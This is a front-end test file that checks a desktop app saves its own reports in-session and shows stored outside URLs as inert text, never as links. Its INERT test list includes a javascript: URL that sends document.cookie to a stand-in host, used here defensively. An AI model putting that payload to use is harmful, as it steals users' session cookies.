// @vitest-environment jsdom
/**
 * A file of the app's own is saved inside the app with the person's session,
 * and a URL stored in the app's data is text, never a one-click open (D-RF N5,
 * rounds 2 and 3).
 *
 * The desktop app's window-open handler opens nothing (electron-main.cjs). Three
 * links leaned on it: the Engagements page's backend report (target="_blank"),
 * the Documents page's "Download File" (target="_blank") and the Evidence
 * page's "View"/"Download" (window.open). In the desktop app they would now do
 * nothing. Before, they went to the system browser, which holds no session, so
 * the report's relay answered 401. A fourth, the scan screens' backend record
 * panel's report, navigated the window away from the page. Now:
 *
 *   - a file on the app's own origin (the report's relay, a document stored as a
 *     path here) is read in the app, on its origin, with the session's cookie
 *     (credentials "include"), and saved from a Blob. No window opens, nothing
 *     navigates, and the save link is never put on the page. A refusal is said in
 *     the server's words, and an answer that is the app's own page is no file.
 *     The Blob URL is revoked later, never with the click: the download the click
 *     starts reads it after the click returns, and revoking at once can leave the
 *     save failed or empty (jsdom cannot show that race; the timing is pinned);
 *   - an http(s) URL to anywhere else, stored as a document's file URL, is text
 *     with a copy button that writes exactly it;
 *   - any other scheme (javascript:, file:, a protocol-relative or backslashed
 *     path to another host) is inert text, flagged, with nothing to copy and no link.
 */
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import type { ReactElement } from "react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";

import Engagements from "@/pages/Engagements";
import Documents from "@/pages/Documents";
import Evidence from "@/pages/Evidence";
import BackendRecordPanel from "@/components/BackendRecordPanel";
import { BLOB_URL_KEPT_MS, saveAppFile } from "@/lib/appFile";
import { Toaster } from "@/components/ui/toaster";
import { PDF_LINK } from "@/lib/backendRecordCopy";
import { queryClient } from "@/lib/queryClient";
import { recordingFetch, requests, standInLayoutApis } from "./helpers/finding-screens";

const NOW = new Date().toISOString();
const PDF = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37, 0x0a, 0x25, 0xe2, 0xe3]);
const OUTSIDE = "files.customer.example";

/** Each stored URL, and what the screen must do with it. */
const APP_PATH = "/documents/q3-report.pdf";
const OUTSIDE_URL = `https://${OUTSIDE}/q3%20report.pdf?sig=a b`;
const INERT = [
  "javascript:fetch('https://files.customer.example/x?c='+document.cookie)",
  "file:///C:/reports/q3.pdf",
  `//${OUTSIDE}/q3.pdf`,
  `/\\${OUTSIDE}/q3.pdf`,
  "ftp://files.customer.example/q3.pdf",
  "q3.pdf",
];

let opened: ReturnType<typeof vi.fn>;
let writeText: ReturnType<typeof vi.fn>;
let blobs: Blob[];
let saved: HTMLAnchorElement[];
/** What each GET of the app's own origin answers; anything else answers {}. */
let answers: Map<string, () => Response>;

beforeAll(standInLayoutApis);
beforeEach(() => {
  requests.length = 0;
  blobs = [];
  saved = [];
  answers = new Map([
    ["/api/scans/t9/backend-pdf", () => new Response(PDF, { status: 200, headers: { "Content-Type": "application/pdf" } })],
    [APP_PATH, () => new Response(PDF, { status: 200, headers: { "Content-Type": "application/pdf" } })],
  ]);
  vi.stubGlobal("fetch", recordingFetch((url) => answers.get(url)?.() ?? {}));
  opened = vi.fn(() => null);
  vi.stubGlobal("open", opened);
  writeText = vi.fn(async () => undefined);
  Object.defineProperty(window.navigator, "clipboard", { value: { writeText }, configurable: true });
  Object.defineProperty(URL, "createObjectURL", { value: vi.fn((blob: Blob) => { blobs.push(blob); return "blob:http://localhost/saved"; }), configurable: true });
  Object.defineProperty(URL, "revokeObjectURL", { value: vi.fn(), configurable: true });
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(function click(this: HTMLAnchorElement) { saved.push(this); });
});
afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  queryClient.clear();
  // Left as no-ops, not removed: a save's revoke runs a minute after the save, after this test.
  Object.defineProperty(URL, "createObjectURL", { value: () => "", configurable: true });
  Object.defineProperty(URL, "revokeObjectURL", { value: () => undefined, configurable: true });
});

/** A page over a seeded cache, with the toaster that says a refusal. */
function mount(ui: ReactElement, seed: Array<[unknown[], unknown]>) {
  const client = new QueryClient({
    defaultOptions: {
      queries: {
        retry: false, staleTime: Infinity, gcTime: Infinity,
        queryFn: async ({ queryKey }) => { throw new Error(`not seeded: ${JSON.stringify(queryKey)}`); },
      },
    },
  });
  for (const [key, value] of [...seed, [["/api/sample-data"], { clients: 0, sites: 0, tests: 0, documents: 0, findings: 0 }], [["/api/auth/check"], { authenticated: true, user: null }]] as Array<[unknown[], unknown]>) {
    client.setQueryData(key, value);
  }
  return render(<QueryClientProvider client={client}>{ui}<Toaster /></QueryClientProvider>);
}

/** Click `link` and expect the file at `path` read with the session and saved as `name`: no window, no navigation. */
async function expectSavedInTheApp(link: HTMLElement, path: string, name: string) {
  expect(link.tagName).toBe("A");
  expect(link.getAttribute("href")).toBe(path);
  expect(link.getAttribute("target"), "no new window").toBeNull();
  const click = new MouseEvent("click", { bubbles: true, cancelable: true });
  await act(async () => { link.dispatchEvent(click); });
  expect(click.defaultPrevented, "the click does not navigate").toBe(true);
  await waitFor(() => expect(saved).toHaveLength(1));
  const reads = (vi.mocked(fetch).mock.calls as Array<[string, RequestInit | undefined]>).filter(([url]) => String(url) === path);
  expect(reads, "one read of the file").toHaveLength(1);
  expect(reads[0][1]?.credentials, "read with the session's cookie").toBe("include");
  expect(reads[0][1]?.method ?? "GET").toBe("GET");
  expect(saved[0].getAttribute("href")).toBe("blob:http://localhost/saved");
  expect(saved[0].download).toBe(name);
  expect(saved[0].isConnected, "the save link is never put on the page").toBe(false);
  expect(blobs).toHaveLength(1);
  // The bytes the app's origin answered, as they came (the Blob is the response's own).
  expect(blobs[0].type).toBe("application/pdf");
  expect(Array.from(new Uint8Array(await blobs[0].arrayBuffer()))).toEqual(Array.from(PDF));
  expect(opened).not.toHaveBeenCalled();
}

/** Each stored URL that is not the app's own: text, a copy button only for http(s), never a link. */
async function expectStoredUrlsAreText(root: HTMLElement) {
  const shown = (value: string) => Array.from(root.querySelectorAll<HTMLElement>("[data-testid='target-url']"))
    .find((one) => one.querySelector("[data-testid='text-target-url']")?.textContent === value);
  const outside = shown(OUTSIDE_URL);
  expect(outside, "the outside URL as text").toBeTruthy();
  expect(outside!.querySelector("[data-testid='text-url-not-http']")).toBeNull();
  const copy = outside!.querySelector<HTMLButtonElement>("[data-testid='button-copy-target-url']");
  expect(copy, "a copy button beside an http(s) URL").not.toBeNull();
  await act(async () => { fireEvent.click(copy!); });
  expect(writeText.mock.calls).toEqual([[OUTSIDE_URL]]);
  for (const value of INERT) {
    const place = shown(value);
    expect(place, `${value} as text`).toBeTruthy();
    expect(place!.querySelector("[data-testid='button-copy-target-url']"), `${value} has no copy button`).toBeNull();
    expect(place!.querySelector("[data-testid='text-url-not-http']")?.textContent, `${value} is flagged`).toBe("not an http(s) address: shown as text only");
  }
  const links = Array.from(root.querySelectorAll("a")).map((a) => a.getAttribute("href") ?? "")
    .filter((href) => href.includes(OUTSIDE) || /^\s*(javascript|file|ftp):/i.test(href) || href === "q3.pdf");
  expect(links, "a link to a stored URL that is not the app's").toEqual([]);
  expect(requests.filter((one) => one.url.includes(OUTSIDE))).toEqual([]);
  expect(opened).not.toHaveBeenCalled();
}

/* ---- the Engagements page: the backend's report, through this app's relay -------- */

const RECORD = {
  readAt: NOW,
  engagements: [{
    id: 7, name: "Acme external", clientName: "Acme", scopeSummary: null, status: "running",
    testingWindowStart: null, testingWindowEnd: null, scopeHosts: [], client: null,
  }],
  scans: [{
    uuid: "s1", targetUrl: "https://app.customer.example/", status: "completed", verdict: "pass", verdictLabel: "Passed",
    createdAt: NOW, collectedAt: NOW, engineRunId: "run-1", stop: null, pdfUrl: "https://backend.example/api/scans/s1/pdf/",
    errorMessage: null, engagement: { id: 7, name: "Acme external", clientName: "Acme", status: "running" },
    test: { id: "t9", status: "completed", clientId: null, stop: null },
  }],
  scansUnread: null, deployments: [], deploymentsUnread: null,
};

function mountEngagements() {
  mount(<Engagements />, [[["/api/record/engagements"], RECORD]]);
  return screen.getByTestId("link-record-pdf");
}

describe("the Engagements page's backend report", () => {
  it("is read in the app with the session and saved, through this app's relay: no window, no system browser", async () => {
    const link = mountEngagements();
    expect(link.textContent).toContain(PDF_LINK);
    await expectSavedInTheApp(link, "/api/scans/t9/backend-pdf", "scan-t9-report.pdf");
  });

  it("says the relay's refusal in its words, and saves nothing", async () => {
    answers.set("/api/scans/t9/backend-pdf", () => new Response(JSON.stringify({ error: "Athena-Backend holds no report for this scan yet" }), {
      status: 409, headers: { "Content-Type": "application/json" },
    }));
    const link = mountEngagements();
    await act(async () => { fireEvent.click(link); });
    await screen.findByText("Could not download the file");
    expect(screen.getByText("Athena-Backend holds no report for this scan yet")).toBeTruthy();
    expect(saved).toEqual([]);
    expect(blobs).toEqual([]);
    expect(opened).not.toHaveBeenCalled();
  });

  it("saves no page of the app's own as the file", async () => {
    answers.set("/api/scans/t9/backend-pdf", () => new Response("<!doctype html><title>Athena</title>", { status: 200, headers: { "Content-Type": "text/html; charset=utf-8" } }));
    const link = mountEngagements();
    await act(async () => { fireEvent.click(link); });
    await screen.findByText("This app holds no file at that address.");
    expect(saved).toEqual([]);
  });
});

/* ---- the Documents page: a document's stored file URL ---------------------------- */

const doc = (id: string, fileUrl: string) => ({
  id, clientId: "c1", title: `Document ${id}`, documentType: "Report", description: null, fileUrl, createdAt: NOW, createdBy: null, isSample: false,
});
const DOCS = [
  doc("app", APP_PATH),
  doc("same-origin", `${window.location.origin}${APP_PATH}`),
  doc("outside", OUTSIDE_URL),
  ...INERT.map((value, i) => doc(`inert-${i}`, value)),
];

describe("the Documents page's stored file URL", () => {
  it("saves a file of the app's own in the app with the session, by its path", async () => {
    mount(<Documents />, [[["/api/documents"], DOCS], [["/api/clients"], [{ id: "c1", name: "Acme" }]]]);
    await expectSavedInTheApp(screen.getByTestId("link-download-app"), APP_PATH, "q3-report.pdf");
  });

  it("reads an absolute URL on the app's own origin as the app's file, by its path", async () => {
    mount(<Documents />, [[["/api/documents"], DOCS], [["/api/clients"], [{ id: "c1", name: "Acme" }]]]);
    await expectSavedInTheApp(screen.getByTestId("link-download-same-origin"), APP_PATH, "q3-report.pdf");
  });

  it("shows an outside URL as text with a copy button, and any other scheme as flagged text: never a link", async () => {
    mount(<Documents />, [[["/api/documents"], DOCS], [["/api/clients"], [{ id: "c1", name: "Acme" }]]]);
    await expectStoredUrlsAreText(document.body);
  });
});

/* ---- the Evidence page: the same documents, in its register ---------------------- */

function mountEvidence() {
  mount(<Evidence />, [
    [["/api/documents"], DOCS], [["/api/users/assignable"], []], [["/api/clients"], [{ id: "c1", name: "Acme" }]], [["/api/tests"], []],
  ]);
}

describe("the Evidence page's documents", () => {
  it("saves a file of the app's own in the app with the session: no window.open", async () => {
    mountEvidence();
    await expectSavedInTheApp(screen.getByTestId("link-evidence-file-app"), APP_PATH, "q3-report.pdf");
  });

  it("shows an outside URL as text with a copy button, and any other scheme as flagged text: never a link or a window", async () => {
    mountEvidence();
    await expectStoredUrlsAreText(document.body);
    // No control on a row opens a window, whatever it holds.
    for (const button of within(document.body).queryAllByRole("button")) {
      if (button.closest("[data-testid='target-url']")) continue;
      fireEvent.click(button);
    }
    expect(opened).not.toHaveBeenCalled();
  });
});

/* ---- the scan screens' backend record panel: the same report --------------------- */

const PANEL = {
  scanId: "s1", engagementId: 7, collected: true, watch: "collected", status: "completed", verdict: "PASS", verdictLabel: "Passed",
  detail: "", collectedAt: NOW, pdfUrl: "/api/scans/t9/backend-pdf", engagement: null, engineRunId: "run-1",
  differsFromDirect: null, mirror: null, lastAnswer: null, lastReadAt: null, lastReadError: null,
} as const;

describe("the backend record panel's report", () => {
  it("is read in the app with the session and saved: the page is never navigated away from", async () => {
    render(<><BackendRecordPanel backend={PANEL as never} target="https://app.customer.example/" /><Toaster /></>);
    const link = screen.getByTestId("link-backend-pdf");
    expect(link.textContent).toContain(PDF_LINK);
    await expectSavedInTheApp(link, "/api/scans/t9/backend-pdf", "scan-s1-report.pdf");
  });

  it("would show a report URL that is not this app's as text, never a link or a request", async () => {
    render(<BackendRecordPanel backend={{ ...PANEL, pdfUrl: `https://${OUTSIDE}/report.pdf` } as never} target={null} />);
    expect(screen.queryByTestId("link-backend-pdf")).toBeNull();
    expect(Array.from(document.querySelectorAll("a")).filter((a) => (a.getAttribute("href") ?? "").includes(OUTSIDE))).toEqual([]);
    expect(screen.getByTestId("text-target-url").textContent).toBe(`https://${OUTSIDE}/report.pdf`);
    expect(requests.filter((one) => one.url.includes(OUTSIDE))).toEqual([]);
  });
});

/* ---- the saved file's Blob URL is revoked later, never with the click ------------- */

describe("the saved file's Blob URL", () => {
  it("is not revoked with the click, nor when the save returns, and is revoked once its time is up", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    try {
      const revoke = vi.mocked(URL.revokeObjectURL);
      let revokedByTheClick: number | null = null;
      vi.mocked(HTMLAnchorElement.prototype.click).mockImplementation(function click(this: HTMLAnchorElement) {
        saved.push(this);
        revokedByTheClick = revoke.mock.calls.length;
      });
      await saveAppFile("/api/scans/t9/backend-pdf", "scan-t9-report.pdf");
      expect(saved).toHaveLength(1);
      expect(revokedByTheClick, "revoked before the click").toBe(0);
      expect(revoke, "revoked with the click, before the download read it").not.toHaveBeenCalled();
      vi.advanceTimersByTime(BLOB_URL_KEPT_MS - 1);
      expect(revoke).not.toHaveBeenCalled();
      vi.advanceTimersByTime(1);
      expect(revoke.mock.calls).toEqual([["blob:http://localhost/saved"]]);
      expect(BLOB_URL_KEPT_MS).toBeGreaterThanOrEqual(10_000);
    } finally {
      vi.useRealTimers();
    }
  });
});
